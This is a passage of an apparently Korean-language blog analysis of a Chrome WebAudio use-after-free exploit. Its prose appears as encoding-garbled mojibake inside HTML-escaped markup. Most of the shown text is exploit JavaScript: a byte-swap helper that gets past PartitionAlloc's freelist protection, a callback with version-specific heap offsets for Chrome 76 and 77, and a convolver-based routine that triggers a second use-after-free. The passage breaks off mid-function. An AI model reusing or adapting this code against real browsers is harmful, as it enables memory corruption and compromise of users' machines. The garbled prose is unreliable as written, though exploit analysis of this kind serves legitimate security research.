&lt;p&gt;ì‹¤í–‰ ì¤‘ì— exploitì€ ì˜¤ë””ì˜¤ ì±„ë„ ë²„í¼ì— 0ì´ ì•„ë‹Œ ë‹¤ë¥¸ê°’ì´ ìˆëŠ”ì§€ ì²´í¬í•´ì„œ ë§Œì•½ ë‹¤ë¥¸ê°’ì´ ìˆë‹¤ë©´ UAFê°€ íŠ¸ë¦¬ê±° ë˜ì—ˆë‹¤ê³  íŒë‹¨í•©ë‹ˆë‹¤. ì´ë ‡ê²Œ UAFë¥¼ íŠ¸ë¦¬ê±°í–ˆìœ¼ë©´ ë²„í¼ì— ë¦­ëœ ê°’ë“¤ì´ ì¡´ì¬í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;byteSwapBigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 
	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    		&lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    		&lt;span class=&quot;nx&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;PartitionAlloc ë©”ëª¨ë¦¬ í• ë‹¹ìëŠ” ìœ„ì²˜ëŸ¼ íŠ¹ìˆ˜í•œ exploit ë³´í˜¸ê¸°ë²•ì´ ì¡´ì¬í•©ë‹ˆë‹¤. ë©”ëª¨ë¦¬ ì˜ì—­ì´ freeë˜ë©´ í¬ì¸í„°ì˜ ì£¼ì†Œë¥¼ ë°”ì´íŠ¸ ìŠ¤ì™‘í•œ ì£¼ì†Œê°€ free listì— ì¶”ê°€ë©ë‹ˆë‹¤. ë”°ë¼ì„œ ì´ ì£¼ì†Œë¥¼ ì°¸ì¡°í•˜ë ¤ê³ í•˜ë©´ í¬ë˜ì‹œê°€ ë°œìƒí•´ì„œ exploitì´ ì–´ë ¤ì›Œì§‘ë‹ˆë‹¤. ì´ ê¸°ë²•ì„ ìš°íšŒí•˜ê¸° ìœ„í•œ ë°”ì´íŠ¸ ìŠ¤ì™‘ í•¨ìˆ˜ê°€ ì¡´ì¬í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sharedAudioCtx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;iirFilterFeedforwardAllocationPtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 
&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;initialUAFCallback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;sharedAudioCtx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;OfflineAudioContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;partitionPageIndexDelta&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;undefined&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;majorVersion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;77&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 77.0.3865.75&lt;/span&gt;
        	 	&lt;span class=&quot;nx&quot;&gt;partitionPageIndexDelta&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        	&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    		&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 76.0.3809.87&lt;/span&gt;
         		&lt;span class=&quot;nx&quot;&gt;partitionPageIndexDelta&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      	   	&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
	&lt;span class=&quot;nx&quot;&gt;iirFilterFeedforwardAllocationPtr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getPartitionPageBaseWithinSuperPage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getPartitionPageIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;partitionPageIndexDelta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xFF0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
    &lt;span class=&quot;nx&quot;&gt;triggerSecondUAF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;byteSwapBigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;iirFilterFeedforwardAllocationPtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;finalUAFCallback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;exploit ì§„í–‰ ì‹œ, leakëœ í¬ì¸í„°ë¥¼ ì¨ì„œ SuperPage ì£¼ì†Œë¥¼ ê°€ì ¸ì™€ í™•ì¸í•©ë‹ˆë‹¤. exploitì´ ì˜ ì§„í–‰ë˜ì—ˆìœ¼ë©´ ë©´ initialUAFCallbackì— temporary_buffer_ ê°ì²´ì˜ raw pointerê°€ ì „ë‹¬ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì´í›„ leakëœ í¬ì¸í„°ë¥¼ ì´ìš©í•´ IIRProcessorê°ì²´ì— ì¡´ì¬í•˜ëŠ” AudioArray &lt;double&gt; íƒ€ì…ì˜ feedforward_ ì£¼ì†Œë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤. ì´ ë°°ì—´ì€ ë™ì¼í•œ SuperPageì— ì¡´ì¬í•´ì•¼ í•˜ì§€ë§Œ ë‹¤ë¥¸ ë²„ì „ì˜ Chromeì—ì„œëŠ” ì´ ê°ì²´ê°€ ë‹¤ë¥¸ PartitionPagesì— ë§Œë“¤ì–´ì ¸ì„œ ì´ë¥¼ ì²˜ë¦¬í•˜ê¸° ìœ„í•œ ì½”ë“œê°€ ì¡´ì¬í•©ë‹ˆë‹¤.&lt;/double&gt;&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;floatArray&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Float32Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;audioBufferArray1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;audioBufferArray2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;imageDataArray&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
 
&lt;span class=&quot;k&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;triggerSecondUAF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;doneCb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;numChannels&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;audioCtx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;OfflineAudioContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;48000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bufferSource&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;audioCtx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createBufferSource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;convolver&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;audioCtx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createConvolver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
 
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bigAudioBuffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;audioCtx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;numChannels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;48000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;smallAudioBuffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;audioCtx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;numChannels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;48000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
	&lt;span class=&quot;nx&quot;&gt;smallAudioBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getChannelData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;numChannels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;channelDataArray&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigUint64Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bigAudioBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getChannelData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    		&lt;span class=&quot;nx&quot;&gt;channelDataArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
	&lt;span class=&quot;nx&quot;&gt;bufferSource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bigAudioBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;convolver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;smallAudioBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 
	&lt;span class=&quot;nx&quot;&gt;bufferSource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;loop&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;bufferSource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;loopStart&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;bufferSource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;loopEnd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 
	&lt;span class=&quot;nx&quot;&gt;bufferSource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;convolver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;convolver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;audioCtx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;destination&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
	&lt;span class=&quot;nx&quot;&gt;bufferSource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
 
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;finished&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 
     	&lt;span class=&quot;nx&quot;&gt;audioCtx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;startRendering&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
     		&lt;span class=&quot;nx&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 
    		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;finished&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        		&lt;span class=&quot;nx&quot;&gt;audioCtx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 
        		&lt;span class=&quot;nx&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;doneCb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        		&lt;span class=&quot;nx&quot;&gt;finished&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 
        		&lt;span class=&quot;nx&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
             		&lt;span class=&quot;nx&quot;&gt;triggerSecondUAF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;doneCb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
